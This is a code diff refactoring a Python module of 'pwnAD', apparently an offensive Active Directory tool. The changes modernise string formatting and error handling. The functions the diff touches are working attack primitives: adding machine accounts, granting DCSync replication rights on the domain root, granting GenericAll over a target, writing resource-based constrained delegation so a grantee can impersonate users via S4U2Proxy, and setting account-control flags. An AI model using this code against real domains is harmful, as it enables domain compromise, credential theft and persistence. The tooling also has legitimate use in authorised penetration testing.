@@ -13,7 +13,7 @@ from pwnAD.lib.accesscontrol import (
     ACCESS_FLAGS, ACCOUNT_FLAGS, UAC_WORKSTATION_TRUST, UAC_NORMAL_ACCOUNT_ENABLED,
     create_allow_ace, create_empty_sd
 )
-from pwnAD.lib.utils import check_error, resolve_target, encode_ldap_value
+from pwnAD.lib.utils import check_error, resolve_target, encode_ldap_value, LDAPOperationError
 from pwnAD.lib.dns import DNSRecord, DNS_RECORD_TYPE, get_zone_dn, get_soa_serial
 
 
@@ -38,33 +38,33 @@ def computer(conn, new_computer=None, new_password=None):
     if not new_password:
         new_password = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
     
-    computer_hostname = new_computer [:-1]
-    newComputerDn = ('cn=%s,%s' % (computer_hostname, computerscontainer)).encode('utf-8')
+    computer_hostname = new_computer[:-1]
+    computer_dn = f'cn={computer_hostname},{computerscontainer}'
 
     # Default computer SPNs
     spns = [
-        'HOST/%s' % computer_hostname,
-        'HOST/%s.%s' % (computer_hostname, conn.domain),
-        'RestrictedKrbHost/%s' % computer_hostname,
-        'RestrictedKrbHost/%s.%s' % (computer_hostname, conn.domain),
+        f'HOST/{computer_hostname}',
+        f'HOST/{computer_hostname}.{conn.domain}',
+        f'RestrictedKrbHost/{computer_hostname}',
+        f'RestrictedKrbHost/{computer_hostname}.{conn.domain}',
     ]
-    ucd = {
-        'dnsHostName': '%s.%s' % (computer_hostname, conn.domain),
+    computer_attrs = {
+        'dnsHostName': f'{computer_hostname}.{conn.domain}',
         'userAccountControl': UAC_WORKSTATION_TRUST,
         'servicePrincipalName': spns,
         'sAMAccountName': new_computer,
-        'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
+        'unicodePwd': f'"{new_password}"'.encode('utf-16-le')
     }
-    logging.debug('New computer info %s', ucd)
+    logging.debug('New computer info %s', computer_attrs)
     logging.info('Attempting to create computer')
-    
+
     try:
         if conn.exists(new_computer):
             logging.error(f"Computer {new_computer} already exists")
             return
         else:
-            conn.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
-            logging.info('Successfully added computer: %s' % new_computer)
+            conn.add(computer_dn, ['top', 'person', 'organizationalPerson', 'user', 'computer'], computer_attrs)
+            logging.info(f'Successfully added computer: {new_computer}')
     except ldap3.core.exceptions.LDAPException as e:
         error_code = conn._ldap_connection.result['result']
         check_error(conn, error_code, e)
@@ -87,7 +87,7 @@ def user(conn, new_user, new_password, OU=None):
     else:
         container = "cn=Users," + conn._baseDN
     user_dn = f"cn={new_user},{container}"
-    password_value = ('"%s"' % new_password).encode('utf-16-le')
+    password_value = f'"{new_password}"'.encode('utf-16-le')
     attr = {
         "objectClass": ["top", "person", "organizationalPerson", "user"],
         "distinguishedName": user_dn,
@@ -119,30 +119,28 @@ def dcsync(conn, trustee):
     Note:
         Adds three ACEs for DS-Replication-Get-Changes GUIDs
     """
-    #Todo : check if account already have dcsync rights
-    targetDN, targetSID = conn.ldap_get_user(trustee)
+    # TODO: check if account already has dcsync rights
+    target_dn, trustee_sid = conn.ldap_get_user(trustee)
 
-    res = conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={conn._baseDN})', attributes=['nTSecurityDescriptor'])
-    if res is None:
-        logging.error('Failed to get forest\'s SD')
-        return
+    conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={conn._baseDN})', attributes=['nTSecurityDescriptor'])
+    if not conn._ldap_connection.entries:
+        raise LDAPOperationError('Failed to get forest\'s SD')
 
     baseDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
     if baseDN_sd['nTSecurityDescriptor'] == []:
-        logging.error("User doesn't have right read nTSecurityDescriptor!")
-        return
+        raise LDAPOperationError("User doesn't have right to read nTSecurityDescriptor")
 
     sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=baseDN_sd['nTSecurityDescriptor'][0])
     new_sd = copy.deepcopy(sd)
     access_mask = ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
 
     for guid in ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c']:
-        logging.debug(f"Creating new ACE for SID : {targetSID} and guid : {guid}")
-        new_sd['Dacl'].aces.append(create_allow_ace(sid=targetSID, object_type=guid, access_mask=access_mask))
+        logging.debug(f"Creating new ACE for SID : {trustee_sid} and guid : {guid}")
+        new_sd['Dacl'].aces.append(create_allow_ace(sid=trustee_sid, object_type=guid, access_mask=access_mask))
 
     try:
         conn.modify(conn._baseDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
-        logging.info("Granted user '%s' DCSYNC rights!" % (trustee))
+        logging.info(f"Granted user '{trustee}' DCSYNC rights!")
     except ldap3.core.exceptions.LDAPException as e:
         error_code = conn._ldap_connection.result['result']
         check_error(conn, error_code, e)
@@ -157,26 +155,25 @@ def genericAll(conn, target, trustee):
         target: sAMAccountName of the target object
         trustee: sAMAccountName of the user receiving the rights
     """
-    #Todo : check if account already have genericAll rights
-    _, trusteeSID = conn.ldap_get_user(trustee)
-    targetDN, _ = conn.ldap_get_user(target)
+    # TODO: check if account already has genericAll rights
+    _, trustee_sid = conn.ldap_get_user(trustee)
+    target_dn, _ = conn.ldap_get_user(target)
 
-    res = conn.search(search_base=targetDN, search_filter=f'(distinguishedName={targetDN})', attributes=['nTSecurityDescriptor'])
-    if res is None:
-        logging.error('Failed to get forest\'s SD')
+    conn.search(search_base=target_dn, search_filter=f'(distinguishedName={target_dn})', attributes=['nTSecurityDescriptor'])
+    if not conn._ldap_connection.entries:
+        raise LDAPOperationError('Failed to get target\'s SD')
 
-    targetDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
-    if targetDN_sd['nTSecurityDescriptor'] == []:
-        logging.error("User doesn't have right read nTSecurityDescriptor!")
-        return
+    target_sd = conn._ldap_connection.entries[0].entry_raw_attributes
+    if target_sd['nTSecurityDescriptor'] == []:
+        raise LDAPOperationError("User doesn't have right to read nTSecurityDescriptor")
 
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetDN_sd['nTSecurityDescriptor'][0])
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_sd['nTSecurityDescriptor'][0])
     new_sd = copy.deepcopy(sd)
-    new_sd['Dacl'].aces.append(create_allow_ace(sid=trusteeSID))
+    new_sd['Dacl'].aces.append(create_allow_ace(sid=trustee_sid))
 
     try:
-        conn.modify(targetDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
-        logging.info("Granted user '%s' generiAll rights over '%s' !" % (trustee, target))
+        conn.modify(target_dn, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
+        logging.info(f"Granted user '{trustee}' GenericAll rights over '{target}' !")
     except ldap3.core.exceptions.LDAPException as e:
         error_code = conn._ldap_connection.result['result']
         check_error(conn, error_code, e)
@@ -260,33 +257,30 @@ def RBCD(conn, target, grantee):
     """
     success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
     if success is False or len(conn._ldap_connection.entries) != 1:
-        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
-        return
+        raise LDAPOperationError(f"Target '{target}' not found")
 
     target_result = conn._ldap_connection.entries[0]
     target_sid = target_result["objectSid"].value
-    logging.info("Found Target DN: %s" % target_result.entry_dn)
-    logging.info("Target SID: %s\n" % target_sid)
+    logging.info(f"Found Target DN: {target_result.entry_dn}")
+    logging.info(f"Target SID: {target_sid}\n")
 
     success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(grantee), attributes=['objectSid'])
     if success is False or len(conn._ldap_connection.entries) != 1:
-        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
-        return
+        raise LDAPOperationError(f"Grantee '{grantee}' not found")
 
     grantee_result = conn._ldap_connection.entries[0]
     grantee_sid = grantee_result["objectSid"].value
-    logging.info("Found Grantee DN: %s" % grantee_result.entry_dn)
-    logging.info("Grantee SID: %s" % grantee_sid)
+    logging.info(f"Found Grantee DN: {grantee_result.entry_dn}")
+    logging.info(f"Grantee SID: {grantee_sid}")
 
     try:
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_result['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
         logging.debug('Currently allowed sids:')
         for ace in sd['Dacl'].aces:
-            logging.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
+            logging.debug(f"    {ace['Ace']['Sid'].formatCanonical()}")
 
             if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
-                logging.error("Grantee is already permitted to perform delegation to the target host")
-                return
+                raise LDAPOperationError("Grantee is already permitted to perform delegation to the target host")
 
     except IndexError:
         sd = create_empty_sd()
@@ -297,7 +291,7 @@ def RBCD(conn, target, grantee):
     try:
         conn.modify(target_result.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, [sd.getData()]]})
         logging.info('Delegation rights modified successfully!')
-        logging.info('%s can now impersonate users on %s via S4U2Proxy' % (grantee, target))
+        logging.info(f'{grantee} can now impersonate users on {target} via S4U2Proxy')
     except ldap3.core.exceptions.LDAPException as e:
         error_code = conn._ldap_connection.result['result']
         check_error(conn, error_code, e)
@@ -317,9 +311,7 @@ def uac(conn, target: str, flags: list):
     for flag in flags:
         flag_upper = flag.upper()
         if flag_upper not in ACCOUNT_FLAGS:
-            logging.error(f"Unknown UAC flag: {flag}")
-            logging.info(f"Available flags: {', '.join(ACCOUNT_FLAGS.keys())}")
-            return
+            raise LDAPOperationError(f"Unknown UAC flag: {flag}. Available flags: {', '.join(ACCOUNT_FLAGS.keys())}")
         uac_to_add |= ACCOUNT_FLAGS[flag_upper]
 
     # Search for the target and get current userAccountControl
@@ -330,8 +322,7 @@ def uac(conn, target: str, flags: list):
     )
 
     if not conn._ldap_connection.entries:
-        logging.error(f"Target '{target}' not found in LDAP")
-        return
+        raise LDAPOperationError(f"Target '{target}' not found in LDAP")
 
     entry = conn._ldap_connection.entries[0]
     target_dn = entry.entry_dn
@@ -339,8 +330,7 @@ def uac(conn, target: str, flags: list):
     try:
         old_uac = entry['userAccountControl'].value
     except (KeyError, IndexError):
-        logging.error(f"Cannot read userAccountControl attribute for '{target}'")
-        return
+        raise LDAPOperationError(f"Cannot read userAccountControl attribute for '{target}'")
 
     # Combine old UAC with new flags using bitwise OR
     new_uac = old_uac | uac_to_add
